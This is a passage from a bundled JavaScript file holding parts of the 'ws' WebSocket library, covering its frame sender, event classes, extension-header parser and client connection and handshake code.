       * @param {Boolean} [options.readOnly=false] Specifies whether `data` can be
       *     modified
       * @param {Boolean} [options.rsv1=false] Specifies whether or not to set the
       *     RSV1 bit
       * @param {Function} [cb] Callback
       * @private
       */
      dispatch(data, compress, options, cb) {
        if (!compress) {
          this.sendFrame(_Sender.frame(data, options), cb);
          return;
        }
        const perMessageDeflate = this._extensions[PerMessageDeflate.extensionName];
        this._bufferedBytes += options[kByteLength];
        this._state = DEFLATING;
        perMessageDeflate.compress(data, options.fin, (_, buf) => {
          if (this._socket.destroyed) {
            const err = new Error(
              "The socket was closed while data was being compressed"
            );
            callCallbacks(this, err, cb);
            return;
          }
          this._bufferedBytes -= options[kByteLength];
          this._state = DEFAULT;
          options.readOnly = false;
          this.sendFrame(_Sender.frame(buf, options), cb);
          this.dequeue();
        });
      }
      /**
       * Executes queued send operations.
       *
       * @private
       */
      dequeue() {
        while (this._state === DEFAULT && this._queue.length) {
          const params = this._queue.shift();
          this._bufferedBytes -= params[3][kByteLength];
          Reflect.apply(params[0], this, params.slice(1));
        }
      }
      /**
       * Enqueues a send operation.
       *
       * @param {Array} params Send operation parameters.
       * @private
       */
      enqueue(params) {
        this._bufferedBytes += params[3][kByteLength];
        this._queue.push(params);
      }
      /**
       * Sends a frame.
       *
       * @param {(Buffer | String)[]} list The frame to send
       * @param {Function} [cb] Callback
       * @private
       */
      sendFrame(list, cb) {
        if (list.length === 2) {
          this._socket.cork();
          this._socket.write(list[0]);
          this._socket.write(list[1], cb);
          this._socket.uncork();
        } else {
          this._socket.write(list[0], cb);
        }
      }
    };
    module2.exports = Sender;
    function callCallbacks(sender, err, cb) {
      if (typeof cb === "function") cb(err);
      for (let i = 0; i < sender._queue.length; i++) {
        const params = sender._queue[i];
        const callback = params[params.length - 1];
        if (typeof callback === "function") callback(err);
      }
    }
    function onError(sender, err, cb) {
      callCallbacks(sender, err, cb);
      sender.onerror(err);
    }
  }
});

// node_modules/ws/lib/event-target.js
var require_event_target = __commonJS({
  "node_modules/ws/lib/event-target.js"(exports2, module2) {
    "use strict";
    var { kForOnEventAttribute, kListener } = require_constants();
    var kCode = /* @__PURE__ */ Symbol("kCode");
    var kData = /* @__PURE__ */ Symbol("kData");
    var kError = /* @__PURE__ */ Symbol("kError");
    var kMessage = /* @__PURE__ */ Symbol("kMessage");
    var kReason = /* @__PURE__ */ Symbol("kReason");
    var kTarget = /* @__PURE__ */ Symbol("kTarget");
    var kType = /* @__PURE__ */ Symbol("kType");
    var kWasClean = /* @__PURE__ */ Symbol("kWasClean");
    var Event = class {
      /**
       * Create a new `Event`.
       *
       * @param {String} type The name of the event
       * @throws {TypeError} If the `type` argument is not specified
       */
      constructor(type) {
        this[kTarget] = null;
        this[kType] = type;
      }
      /**
       * @type {*}
       */
      get target() {
        return this[kTarget];
      }
      /**
       * @type {String}
       */
      get type() {
        return this[kType];
      }
    };
    Object.defineProperty(Event.prototype, "target", { enumerable: true });
    Object.defineProperty(Event.prototype, "type", { enumerable: true });
    var CloseEvent = class extends Event {
      /**
       * Create a new `CloseEvent`.
       *
       * @param {String} type The name of the event
       * @param {Object} [options] A dictionary object that allows for setting
       *     attributes via object members of the same name
       * @param {Number} [options.code=0] The status code explaining why the
       *     connection was closed
       * @param {String} [options.reason=''] A human-readable string explaining why
       *     the connection was closed
       * @param {Boolean} [options.wasClean=false] Indicates whether or not the
       *     connection was cleanly closed
       */
      constructor(type, options = {}) {
        super(type);
        this[kCode] = options.code === void 0 ? 0 : options.code;
        this[kReason] = options.reason === void 0 ? "" : options.reason;
        this[kWasClean] = options.wasClean === void 0 ? false : options.wasClean;
      }
      /**
       * @type {Number}
       */
      get code() {
        return this[kCode];
      }
      /**
       * @type {String}
       */
      get reason() {
        return this[kReason];
      }
      /**
       * @type {Boolean}
       */
      get wasClean() {
        return this[kWasClean];
      }
    };
    Object.defineProperty(CloseEvent.prototype, "code", { enumerable: true });
    Object.defineProperty(CloseEvent.prototype, "reason", { enumerable: true });
    Object.defineProperty(CloseEvent.prototype, "wasClean", { enumerable: true });
    var ErrorEvent = class extends Event {
      /**
       * Create a new `ErrorEvent`.
       *
       * @param {String} type The name of the event
       * @param {Object} [options] A dictionary object that allows for setting
       *     attributes via object members of the same name
       * @param {*} [options.error=null] The error that generated this event
       * @param {String} [options.message=''] The error message
       */
      constructor(type, options = {}) {
        super(type);
        this[kError] = options.error === void 0 ? null : options.error;
        this[kMessage] = options.message === void 0 ? "" : options.message;
      }
      /**
       * @type {*}
       */
      get error() {
        return this[kError];
      }
      /**
       * @type {String}
       */
      get message() {
        return this[kMessage];
      }
    };
    Object.defineProperty(ErrorEvent.prototype, "error", { enumerable: true });
    Object.defineProperty(ErrorEvent.prototype, "message", { enumerable: true });
    var MessageEvent = class extends Event {
      /**
       * Create a new `MessageEvent`.
       *
       * @param {String} type The name of the event
       * @param {Object} [options] A dictionary object that allows for setting
       *     attributes via object members of the same name
       * @param {*} [options.data=null] The message content
       */
      constructor(type, options = {}) {
        super(type);
        this[kData] = options.data === void 0 ? null : options.data;
      }
      /**
       * @type {*}
       */
      get data() {
        return this[kData];
      }
    };
    Object.defineProperty(MessageEvent.prototype, "data", { enumerable: true });
    var EventTarget = {
      /**
       * Register an event listener.
       *
       * @param {String} type A string representing the event type to listen for
       * @param {(Function|Object)} handler The listener to add
       * @param {Object} [options] An options object specifies characteristics about
       *     the event listener
       * @param {Boolean} [options.once=false] A `Boolean` indicating that the
       *     listener should be invoked at most once after being added. If `true`,
       *     the listener would be automatically removed when invoked.
       * @public
       */
      addEventListener(type, handler, options = {}) {
        for (const listener of this.listeners(type)) {
          if (!options[kForOnEventAttribute] && listener[kListener] === handler && !listener[kForOnEventAttribute]) {
            return;
          }
        }
        let wrapper;
        if (type === "message") {
          wrapper = function onMessage(data, isBinary) {
            const event = new MessageEvent("message", {
              data: isBinary ? data : data.toString()
            });
            event[kTarget] = this;
            callListener(handler, this, event);
          };
        } else if (type === "close") {
          wrapper = function onClose(code2, message) {
            const event = new CloseEvent("close", {
              code: code2,
              reason: message.toString(),
              wasClean: this._closeFrameReceived && this._closeFrameSent
            });
            event[kTarget] = this;
            callListener(handler, this, event);
          };
        } else if (type === "error") {
          wrapper = function onError(error) {
            const event = new ErrorEvent("error", {
              error,
              message: error.message
            });
            event[kTarget] = this;
            callListener(handler, this, event);
          };
        } else if (type === "open") {
          wrapper = function onOpen() {
            const event = new Event("open");
            event[kTarget] = this;
            callListener(handler, this, event);
          };
        } else {
          return;
        }
        wrapper[kForOnEventAttribute] = !!options[kForOnEventAttribute];
        wrapper[kListener] = handler;
        if (options.once) {
          this.once(type, wrapper);
        } else {
          this.on(type, wrapper);
        }
      },
      /**
       * Remove an event listener.
       *
       * @param {String} type A string representing the event type to remove
       * @param {(Function|Object)} handler The listener to remove
       * @public
       */
      removeEventListener(type, handler) {
        for (const listener of this.listeners(type)) {
          if (listener[kListener] === handler && !listener[kForOnEventAttribute]) {
            this.removeListener(type, listener);
            break;
          }
        }
      }
    };
    module2.exports = {
      CloseEvent,
      ErrorEvent,
      Event,
      EventTarget,
      MessageEvent
    };
    function callListener(listener, thisArg, event) {
      if (typeof listener === "object" && listener.handleEvent) {
        listener.handleEvent.call(listener, event);
      } else {
        listener.call(thisArg, event);
      }
    }
  }
});

// node_modules/ws/lib/extension.js
var require_extension = __commonJS({
  "node_modules/ws/lib/extension.js"(exports2, module2) {
    "use strict";
    var { tokenChars } = require_validation();
    function push(dest, name, elem) {
      if (dest[name] === void 0) dest[name] = [elem];
      else dest[name].push(elem);
    }
    function parse(header) {
      const offers = /* @__PURE__ */ Object.create(null);
      let params = /* @__PURE__ */ Object.create(null);
      let mustUnescape = false;
      let isEscaping = false;
      let inQuotes = false;
      let extensionName;
      let paramName;
      let start = -1;
      let code2 = -1;
      let end = -1;
      let i = 0;
      for (; i < header.length; i++) {
        code2 = header.charCodeAt(i);
        if (extensionName === void 0) {
          if (end === -1 && tokenChars[code2] === 1) {
            if (start === -1) start = i;
          } else if (i !== 0 && (code2 === 32 || code2 === 9)) {
            if (end === -1 && start !== -1) end = i;
          } else if (code2 === 59 || code2 === 44) {
            if (start === -1) {
              throw new SyntaxError(`Unexpected character at index ${i}`);
            }
            if (end === -1) end = i;
            const name = header.slice(start, end);
            if (code2 === 44) {
              push(offers, name, params);
              params = /* @__PURE__ */ Object.create(null);
            } else {
              extensionName = name;
            }
            start = end = -1;
          } else {
            throw new SyntaxError(`Unexpected character at index ${i}`);
          }
        } else if (paramName === void 0) {
          if (end === -1 && tokenChars[code2] === 1) {
            if (start === -1) start = i;
          } else if (code2 === 32 || code2 === 9) {
            if (end === -1 && start !== -1) end = i;
          } else if (code2 === 59 || code2 === 44) {
            if (start === -1) {
              throw new SyntaxError(`Unexpected character at index ${i}`);
            }
            if (end === -1) end = i;
            push(params, header.slice(start, end), true);
            if (code2 === 44) {
              push(offers, extensionName, params);
              params = /* @__PURE__ */ Object.create(null);
              extensionName = void 0;
            }
            start = end = -1;
          } else if (code2 === 61 && start !== -1 && end === -1) {
            paramName = header.slice(start, i);
            start = end = -1;
          } else {
            throw new SyntaxError(`Unexpected character at index ${i}`);
          }
        } else {
          if (isEscaping) {
            if (tokenChars[code2] !== 1) {
              throw new SyntaxError(`Unexpected character at index ${i}`);
            }
            if (start === -1) start = i;
            else if (!mustUnescape) mustUnescape = true;
            isEscaping = false;
          } else if (inQuotes) {
            if (tokenChars[code2] === 1) {
              if (start === -1) start = i;
            } else if (code2 === 34 && start !== -1) {
              inQuotes = false;
              end = i;
            } else if (code2 === 92) {
              isEscaping = true;
            } else {
              throw new SyntaxError(`Unexpected character at index ${i}`);
            }
          } else if (code2 === 34 && header.charCodeAt(i - 1) === 61) {
            inQuotes = true;
          } else if (end === -1 && tokenChars[code2] === 1) {
            if (start === -1) start = i;
          } else if (start !== -1 && (code2 === 32 || code2 === 9)) {
            if (end === -1) end = i;
          } else if (code2 === 59 || code2 === 44) {
            if (start === -1) {
              throw new SyntaxError(`Unexpected character at index ${i}`);
            }
            if (end === -1) end = i;
            let value = header.slice(start, end);
            if (mustUnescape) {
              value = value.replace(/\\/g, "");
              mustUnescape = false;
            }
            push(params, paramName, value);
            if (code2 === 44) {
              push(offers, extensionName, params);
              params = /* @__PURE__ */ Object.create(null);
              extensionName = void 0;
            }
            paramName = void 0;
            start = end = -1;
          } else {
            throw new SyntaxError(`Unexpected character at index ${i}`);
          }
        }
      }
      if (start === -1 || inQuotes || code2 === 32 || code2 === 9) {
        throw new SyntaxError("Unexpected end of input");
      }
      if (end === -1) end = i;
      const token = header.slice(start, end);
      if (extensionName === void 0) {
        push(offers, token, params);
      } else {
        if (paramName === void 0) {
          push(params, token, true);
        } else if (mustUnescape) {
          push(params, paramName, token.replace(/\\/g, ""));
        } else {
          push(params, paramName, token);
        }
        push(offers, extensionName, params);
      }
      return offers;
    }
    function format(extensions) {
      return Object.keys(extensions).map((extension) => {
        let configurations = extensions[extension];
        if (!Array.isArray(configurations)) configurations = [configurations];
        return configurations.map((params) => {
          return [extension].concat(
            Object.keys(params).map((k) => {
              let values2 = params[k];
              if (!Array.isArray(values2)) values2 = [values2];
              return values2.map((v) => v === true ? k : `${k}=${v}`).join("; ");
            })
          ).join("; ");
        }).join(", ");
      }).join(", ");
    }
    module2.exports = { format, parse };
  }
});

// node_modules/ws/lib/websocket.js
var require_websocket = __commonJS({
  "node_modules/ws/lib/websocket.js"(exports2, module2) {
    "use strict";
    var EventEmitter = require("events");
    var https2 = require("https");
    var http2 = require("http");
    var net = require("net");
    var tls = require("tls");
    var { randomBytes, createHash } = require("crypto");
    var { Duplex, Readable } = require("stream");
    var { URL: URL2 } = require("url");
    var PerMessageDeflate = require_permessage_deflate();
    var Receiver = require_receiver();
    var Sender = require_sender();
    var { isBlob } = require_validation();
    var {
      BINARY_TYPES,
      CLOSE_TIMEOUT,
      EMPTY_BUFFER,
      GUID,
      kForOnEventAttribute,
      kListener,
      kStatusCode,
      kWebSocket,
      NOOP
    } = require_constants();
    var {
      EventTarget: { addEventListener, removeEventListener }
    } = require_event_target();
    var { format, parse } = require_extension();
    var { toBuffer } = require_buffer_util();
    var kAborted = /* @__PURE__ */ Symbol("kAborted");
    var protocolVersions = [8, 13];
    var readyStates = ["CONNECTING", "OPEN", "CLOSING", "CLOSED"];
    var subprotocolRegex = /^[!#$%&'*+\-.0-9A-Z^_`|a-z~]+$/;
    var WebSocket = class _WebSocket extends EventEmitter {
      /**
       * Create a new `WebSocket`.
       *
       * @param {(String|URL)} address The URL to which to connect
       * @param {(String|String[])} [protocols] The subprotocols
       * @param {Object} [options] Connection options
       */
      constructor(address, protocols, options) {
        super();
        this._binaryType = BINARY_TYPES[0];
        this._closeCode = 1006;
        this._closeFrameReceived = false;
        this._closeFrameSent = false;
        this._closeMessage = EMPTY_BUFFER;
        this._closeTimer = null;
        this._errorEmitted = false;
        this._extensions = {};
        this._paused = false;
        this._protocol = "";
        this._readyState = _WebSocket.CONNECTING;
        this._receiver = null;
        this._sender = null;
        this._socket = null;
        if (address !== null) {
          this._bufferedAmount = 0;
          this._isServer = false;
          this._redirects = 0;
          if (protocols === void 0) {
            protocols = [];
          } else if (!Array.isArray(protocols)) {
            if (typeof protocols === "object" && protocols !== null) {
              options = protocols;
              protocols = [];
            } else {
              protocols = [protocols];
            }
          }
          initAsClient(this, address, protocols, options);
        } else {
          this._autoPong = options.autoPong;
          this._closeTimeout = options.closeTimeout;
          this._isServer = true;
        }
      }
      /**
       * For historical reasons, the custom "nodebuffer" type is used by the default
       * instead of "blob".
       *
       * @type {String}
       */
      get binaryType() {
        return this._binaryType;
      }
      set binaryType(type) {
        if (!BINARY_TYPES.includes(type)) return;
        this._binaryType = type;
        if (this._receiver) this._receiver._binaryType = type;
      }
      /**
       * @type {Number}
       */
      get bufferedAmount() {
        if (!this._socket) return this._bufferedAmount;
        return this._socket._writableState.length + this._sender._bufferedBytes;
      }
      /**
       * @type {String}
       */
      get extensions() {
        return Object.keys(this._extensions).join();
      }
      /**
       * @type {Boolean}
       */
      get isPaused() {
        return this._paused;
      }
      /**
       * @type {Function}
       */
      /* istanbul ignore next */
      get onclose() {
        return null;
      }
      /**
       * @type {Function}
       */
      /* istanbul ignore next */
      get onerror() {
        return null;
      }
      /**
       * @type {Function}
       */
      /* istanbul ignore next */
      get onopen() {
        return null;
      }
      /**
       * @type {Function}
       */
      /* istanbul ignore next */
      get onmessage() {
        return null;
      }
      /**
       * @type {String}
       */
      get protocol() {
        return this._protocol;
      }
      /**
       * @type {Number}
       */
      get readyState() {
        return this._readyState;
      }
      /**
       * @type {String}
       */
      get url() {
        return this._url;
      }
      /**
       * Set up the socket and the internal resources.
       *
       * @param {Duplex} socket The network socket between the server and client
       * @param {Buffer} head The first packet of the upgraded stream
       * @param {Object} options Options object
       * @param {Boolean} [options.allowSynchronousEvents=false] Specifies whether
       *     any of the `'message'`, `'ping'`, and `'pong'` events can be emitted
       *     multiple times in the same tick
       * @param {Function} [options.generateMask] The function used to generate the
       *     masking key
       * @param {Number} [options.maxPayload=0] The maximum allowed message size
       * @param {Boolean} [options.skipUTF8Validation=false] Specifies whether or
       *     not to skip UTF-8 validation for text and close messages
       * @private
       */
      setSocket(socket, head2, options) {
        const receiver = new Receiver({
          allowSynchronousEvents: options.allowSynchronousEvents,
          binaryType: this.binaryType,
          extensions: this._extensions,
          isServer: this._isServer,
          maxPayload: options.maxPayload,
          skipUTF8Validation: options.skipUTF8Validation
        });
        const sender = new Sender(socket, this._extensions, options.generateMask);
        this._receiver = receiver;
        this._sender = sender;
        this._socket = socket;
        receiver[kWebSocket] = this;
        sender[kWebSocket] = this;
        socket[kWebSocket] = this;
        receiver.on("conclude", receiverOnConclude);
        receiver.on("drain", receiverOnDrain);
        receiver.on("error", receiverOnError);
        receiver.on("message", receiverOnMessage);
        receiver.on("ping", receiverOnPing);
        receiver.on("pong", receiverOnPong);
        sender.onerror = senderOnError;
        if (socket.setTimeout) socket.setTimeout(0);
        if (socket.setNoDelay) socket.setNoDelay();
        if (head2.length > 0) socket.unshift(head2);
        socket.on("close", socketOnClose);
        socket.on("data", socketOnData);
        socket.on("end", socketOnEnd);
        socket.on("error", socketOnError);
        this._readyState = _WebSocket.OPEN;
        this.emit("open");
      }
      /**
       * Emit the `'close'` event.
       *
       * @private
       */
      emitClose() {
        if (!this._socket) {
          this._readyState = _WebSocket.CLOSED;
          this.emit("close", this._closeCode, this._closeMessage);
          return;
        }
        if (this._extensions[PerMessageDeflate.extensionName]) {
          this._extensions[PerMessageDeflate.extensionName].cleanup();
        }
        this._receiver.removeAllListeners();
        this._readyState = _WebSocket.CLOSED;
        this.emit("close", this._closeCode, this._closeMessage);
      }
      /**
       * Start a closing handshake.
       *
       *          +----------+   +-----------+   +----------+
       *     - - -|ws.close()|-->|close frame|-->|ws.close()|- - -
       *    |     +----------+   +-----------+   +----------+     |
       *          +----------+   +-----------+         |
       * CLOSING  |ws.close()|<--|close frame|<--+-----+       CLOSING
       *          +----------+   +-----------+   |
       *    |           |                        |   +---+        |
       *                +------------------------+-->|fin| - - - -
       *    |         +---+                      |   +---+
       *     - - - - -|fin|<---------------------+
       *              +---+
       *
       * @param {Number} [code] Status code explaining why the connection is closing
       * @param {(String|Buffer)} [data] The reason why the connection is
       *     closing
       * @public
       */
      close(code2, data) {
        if (this.readyState === _WebSocket.CLOSED) return;
        if (this.readyState === _WebSocket.CONNECTING) {
          const msg = "WebSocket was closed before the connection was established";
          abortHandshake(this, this._req, msg);
          return;
        }
        if (this.readyState === _WebSocket.CLOSING) {
          if (this._closeFrameSent && (this._closeFrameReceived || this._receiver._writableState.errorEmitted)) {
            this._socket.end();
          }
          return;
        }
        this._readyState = _WebSocket.CLOSING;
        this._sender.close(code2, data, !this._isServer, (err) => {
          if (err) return;
          this._closeFrameSent = true;
          if (this._closeFrameReceived || this._receiver._writableState.errorEmitted) {
            this._socket.end();
          }
        });
        setCloseTimer(this);
      }
      /**
       * Pause the socket.
       *
       * @public
       */
      pause() {
        if (this.readyState === _WebSocket.CONNECTING || this.readyState === _WebSocket.CLOSED) {
          return;
        }
        this._paused = true;
        this._socket.pause();
      }
      /**
       * Send a ping.
       *
       * @param {*} [data] The data to send
       * @param {Boolean} [mask] Indicates whether or not to mask `data`
       * @param {Function} [cb] Callback which is executed when the ping is sent
       * @public
       */
      ping(data, mask, cb) {
        if (this.readyState === _WebSocket.CONNECTING) {
          throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");
        }
        if (typeof data === "function") {
          cb = data;
          data = mask = void 0;
        } else if (typeof mask === "function") {
          cb = mask;
          mask = void 0;
        }
        if (typeof data === "number") data = data.toString();
        if (this.readyState !== _WebSocket.OPEN) {
          sendAfterClose(this, data, cb);
          return;
        }
        if (mask === void 0) mask = !this._isServer;
        this._sender.ping(data || EMPTY_BUFFER, mask, cb);
      }
      /**
       * Send a pong.
       *
       * @param {*} [data] The data to send
       * @param {Boolean} [mask] Indicates whether or not to mask `data`
       * @param {Function} [cb] Callback which is executed when the pong is sent
       * @public
       */
      pong(data, mask, cb) {
        if (this.readyState === _WebSocket.CONNECTING) {
          throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");
        }
        if (typeof data === "function") {
          cb = data;
          data = mask = void 0;
        } else if (typeof mask === "function") {
          cb = mask;
          mask = void 0;
        }
        if (typeof data === "number") data = data.toString();
        if (this.readyState !== _WebSocket.OPEN) {
          sendAfterClose(this, data, cb);
          return;
        }
        if (mask === void 0) mask = !this._isServer;
        this._sender.pong(data || EMPTY_BUFFER, mask, cb);
      }
      /**
       * Resume the socket.
       *
       * @public
       */
      resume() {
        if (this.readyState === _WebSocket.CONNECTING || this.readyState === _WebSocket.CLOSED) {
          return;
        }
        this._paused = false;
        if (!this._receiver._writableState.needDrain) this._socket.resume();
      }
      /**
       * Send a data message.
       *
       * @param {*} data The message to send
       * @param {Object} [options] Options object
       * @param {Boolean} [options.binary] Specifies whether `data` is binary or
       *     text
       * @param {Boolean} [options.compress] Specifies whether or not to compress
       *     `data`
       * @param {Boolean} [options.fin=true] Specifies whether the fragment is the
       *     last one
       * @param {Boolean} [options.mask] Specifies whether or not to mask `data`
       * @param {Function} [cb] Callback which is executed when data is written out
       * @public
       */
      send(data, options, cb) {
        if (this.readyState === _WebSocket.CONNECTING) {
          throw new Error("WebSocket is not open: readyState 0 (CONNECTING)");
        }
        if (typeof options === "function") {
          cb = options;
          options = {};
        }
        if (typeof data === "number") data = data.toString();
        if (this.readyState !== _WebSocket.OPEN) {
          sendAfterClose(this, data, cb);
          return;
        }
        const opts = {
          binary: typeof data !== "string",
          mask: !this._isServer,
          compress: true,
          fin: true,
          ...options
        };
        if (!this._extensions[PerMessageDeflate.extensionName]) {
          opts.compress = false;
        }
        this._sender.send(data || EMPTY_BUFFER, opts, cb);
      }
      /**
       * Forcibly close the connection.
       *
       * @public
       */
      terminate() {
        if (this.readyState === _WebSocket.CLOSED) return;
        if (this.readyState === _WebSocket.CONNECTING) {
          const msg = "WebSocket was closed before the connection was established";
          abortHandshake(this, this._req, msg);
          return;
        }
        if (this._socket) {
          this._readyState = _WebSocket.CLOSING;
          this._socket.destroy();
        }
      }
    };
    Object.defineProperty(WebSocket, "CONNECTING", {
      enumerable: true,
      value: readyStates.indexOf("CONNECTING")
    });
    Object.defineProperty(WebSocket.prototype, "CONNECTING", {
      enumerable: true,
      value: readyStates.indexOf("CONNECTING")
    });
    Object.defineProperty(WebSocket, "OPEN", {
      enumerable: true,
      value: readyStates.indexOf("OPEN")
    });
    Object.defineProperty(WebSocket.prototype, "OPEN", {
      enumerable: true,
      value: readyStates.indexOf("OPEN")
    });
    Object.defineProperty(WebSocket, "CLOSING", {
      enumerable: true,
      value: readyStates.indexOf("CLOSING")
    });
    Object.defineProperty(WebSocket.prototype, "CLOSING", {
      enumerable: true,
      value: readyStates.indexOf("CLOSING")
    });
    Object.defineProperty(WebSocket, "CLOSED", {
      enumerable: true,
      value: readyStates.indexOf("CLOSED")
    });
    Object.defineProperty(WebSocket.prototype, "CLOSED", {
      enumerable: true,
      value: readyStates.indexOf("CLOSED")
    });
    [
      "binaryType",
      "bufferedAmount",
      "extensions",
      "isPaused",
      "protocol",
      "readyState",
      "url"
    ].forEach((property2) => {
      Object.defineProperty(WebSocket.prototype, property2, { enumerable: true });
    });
    ["open", "error", "close", "message"].forEach((method) => {
      Object.defineProperty(WebSocket.prototype, `on${method}`, {
        enumerable: true,
        get() {
          for (const listener of this.listeners(method)) {
            if (listener[kForOnEventAttribute]) return listener[kListener];
          }
          return null;
        },
        set(handler) {
          for (const listener of this.listeners(method)) {
            if (listener[kForOnEventAttribute]) {
              this.removeListener(method, listener);
              break;
            }
          }
          if (typeof handler !== "function") return;
          this.addEventListener(method, handler, {
            [kForOnEventAttribute]: true
          });
        }
      });
    });
    WebSocket.prototype.addEventListener = addEventListener;
    WebSocket.prototype.removeEventListener = removeEventListener;
    module2.exports = WebSocket;
    function initAsClient(websocket, address, protocols, options) {
      const opts = {
        allowSynchronousEvents: true,
        autoPong: true,
        closeTimeout: CLOSE_TIMEOUT,
        protocolVersion: protocolVersions[1],
        maxPayload: 100 * 1024 * 1024,
        skipUTF8Validation: false,
        perMessageDeflate: true,
        followRedirects: false,
        maxRedirects: 10,
        ...options,
        socketPath: void 0,
        hostname: void 0,
        protocol: void 0,
        timeout: void 0,
        method: "GET",
        host: void 0,
        path: void 0,
        port: void 0
      };
      websocket._autoPong = opts.autoPong;
      websocket._closeTimeout = opts.closeTimeout;
      if (!protocolVersions.includes(opts.protocolVersion)) {
        throw new RangeError(
          `Unsupported protocol version: ${opts.protocolVersion} (supported versions: ${protocolVersions.join(", ")})`
        );
      }
      let parsedUrl;
      if (address instanceof URL2) {
        parsedUrl = address;
      } else {
        try {
          parsedUrl = new URL2(address);
        } catch (e) {
          throw new SyntaxError(`Invalid URL: ${address}`);
        }
      }
      if (parsedUrl.protocol === "http:") {
        parsedUrl.protocol = "ws:";
      } else if (parsedUrl.protocol === "https:") {
        parsedUrl.protocol = "wss:";
      }
      websocket._url = parsedUrl.href;
      const isSecure = parsedUrl.protocol === "wss:";
      const isIpcUrl = parsedUrl.protocol === "ws+unix:";
      let invalidUrlMessage;
      if (parsedUrl.protocol !== "ws:" && !isSecure && !isIpcUrl) {
        invalidUrlMessage = `The URL's protocol must be one of "ws:", "wss:", "http:", "https:", or "ws+unix:"`;
      } else if (isIpcUrl && !parsedUrl.pathname) {
        invalidUrlMessage = "The URL's pathname is empty";
      } else if (parsedUrl.hash) {
        invalidUrlMessage = "The URL contains a fragment identifier";
      }
      if (invalidUrlMessage) {
        const err = new SyntaxError(invalidUrlMessage);
        if (websocket._redirects === 0) {
          throw err;
        } else {
          emitErrorAndClose(websocket, err);
          return;
        }
      }
      const defaultPort = isSecure ? 443 : 80;
      const key = randomBytes(16).toString("base64");
      const request = isSecure ? https2.request : http2.request;
      const protocolSet = /* @__PURE__ */ new Set();
      let perMessageDeflate;
      opts.createConnection = opts.createConnection || (isSecure ? tlsConnect : netConnect);
      opts.defaultPort = opts.defaultPort || defaultPort;
      opts.port = parsedUrl.port || defaultPort;
      opts.host = parsedUrl.hostname.startsWith("[") ? parsedUrl.hostname.slice(1, -1) : parsedUrl.hostname;
      opts.headers = {
        ...opts.headers,
        "Sec-WebSocket-Version": opts.protocolVersion,
        "Sec-WebSocket-Key": key,
        Connection: "Upgrade",
        Upgrade: "websocket"
      };
      opts.path = parsedUrl.pathname + parsedUrl.search;
      opts.timeout = opts.handshakeTimeout;
      if (opts.perMessageDeflate) {
        perMessageDeflate = new PerMessageDeflate(
          opts.perMessageDeflate !== true ? opts.perMessageDeflate : {},
          false,
          opts.maxPayload
        );
        opts.headers["Sec-WebSocket-Extensions"] = format({
          [PerMessageDeflate.extensionName]: perMessageDeflate.offer()
        });
      }
      if (protocols.length) {
        for (const protocol of protocols) {
          if (typeof protocol !== "string" || !subprotocolRegex.test(protocol) || protocolSet.has(protocol)) {
            throw new SyntaxError(
              "An invalid or duplicated subprotocol was specified"
            );
          }
          protocolSet.add(protocol);
        }
        opts.headers["Sec-WebSocket-Protocol"] = protocols.join(",");
      }
      if (opts.origin) {
        if (opts.protocolVersion < 13) {
          opts.headers["Sec-WebSocket-Origin"] = opts.origin;
        } else {
          opts.headers.Origin = opts.origin;
        }
      }
      if (parsedUrl.username || parsedUrl.password) {
        opts.auth = `${parsedUrl.username}:${parsedUrl.password}`;
      }
      if (isIpcUrl) {
        const parts = opts.path.split(":");
        opts.socketPath = parts[0];
        opts.path = parts[1];
      }
      let req;
      if (opts.followRedirects) {
        if (websocket._redirects === 0) {
          websocket._originalIpc = isIpcUrl;
          websocket._originalSecure = isSecure;
          websocket._originalHostOrSocketPath = isIpcUrl ? opts.socketPath : parsedUrl.host;
          const headers = options && options.headers;
          options = { ...options, headers: {} };
          if (headers) {
            for (const [key2, value] of Object.entries(headers)) {
              options.headers[key2.toLowerCase()] = value;
            }
          }
        } else if (websocket.listenerCount("redirect") === 0) {
          const isSameHost = isIpcUrl ? websocket._originalIpc ? opts.socketPath === websocket._originalHostOrSocketPath : false : websocket._originalIpc ? false : parsedUrl.host === websocket._originalHostOrSocketPath;
          if (!isSameHost || websocket._originalSecure && !isSecure) {
            delete opts.headers.authorization;
            delete opts.headers.cookie;
            if (!isSameHost) delete opts.headers.host;
            opts.auth = void 0;
          }
        }
        if (opts.auth && !options.headers.authorization) {
          options.headers.authorization = "Basic " + Buffer.from(opts.auth).toString("base64");
        }
        req = websocket._req = request(opts);
        if (websocket._redirects) {
          websocket.emit("redirect", websocket.url, req);
        }
      } else {
        req = websocket._req = request(opts);
      }
      if (opts.timeout) {
        req.on("timeout", () => {
          abortHandshake(websocket, req, "Opening handshake has timed out");
        });
      }
      req.on("error", (err) => {
        if (req === null || req[kAborted]) return;
        req = websocket._req = null;
        emitErrorAndClose(websocket, err);
      });
      req.on("response", (res) => {
        const location = res.headers.location;
        const statusCode = res.statusCode;
        if (location && opts.followRedirects && statusCode >= 300 && statusCode < 400) {
          if (++websocket._redirects > opts.maxRedirects) {
            abortHandshake(websocket, req, "Maximum redirects exceeded");
            return;
          }
          req.abort();
          let addr;
          try {
            addr = new URL2(location, address);
          } catch (e) {
            const err = new SyntaxError(`Invalid URL: ${location}`);
            emitErrorAndClose(websocket, err);
            return;
          }
          initAsClient(websocket, addr, protocols, options);
        } else if (!websocket.emit("unexpected-response", req, res)) {
          abortHandshake(
            websocket,
            req,
            `Unexpected server response: ${res.statusCode}`
          );
        }
      });
      req.on("upgrade", (res, socket, head2) => {
        websocket.emit("upgrade", res);
        if (websocket.readyState !== WebSocket.CONNECTING) return;
        req = websocket._req = null;
        const upgrade = res.headers.upgrade;
        if (upgrade === void 0 || upgrade.toLowerCase() !== "websocket") {
          abortHandshake(websocket, socket, "Invalid Upgrade header");
          return;
        }
        const digest = createHash("sha1").update(key + GUID).digest("base64");
        if (res.headers["sec-websocket-accept"] !== digest) {
          abortHandshake(websocket, socket, "Invalid Sec-WebSocket-Accept header");
          return;
        }
        const serverProt = res.headers["sec-websocket-protocol"];
        let protError;
        if (serverProt !== void 0) {
          if (!protocolSet.size) {
            protError = "Server sent a subprotocol but none was requested";
          } else if (!protocolSet.has(serverProt)) {
            protError = "Server sent an invalid subprotocol";
          }
        } else if (protocolSet.size) {
          protError = "Server sent no subprotocol";
        }
        if (protError) {
          abortHandshake(websocket, socket, protError);
          return;
        }
        if (serverProt) websocket._protocol = serverProt;
        const secWebSocketExtensions = res.headers["sec-websocket-extensions"];
        if (secWebSocketExtensions !== void 0) {
          if (!perMessageDeflate) {
            const message = "Server sent a Sec-WebSocket-Extensions header but no extension was requested";
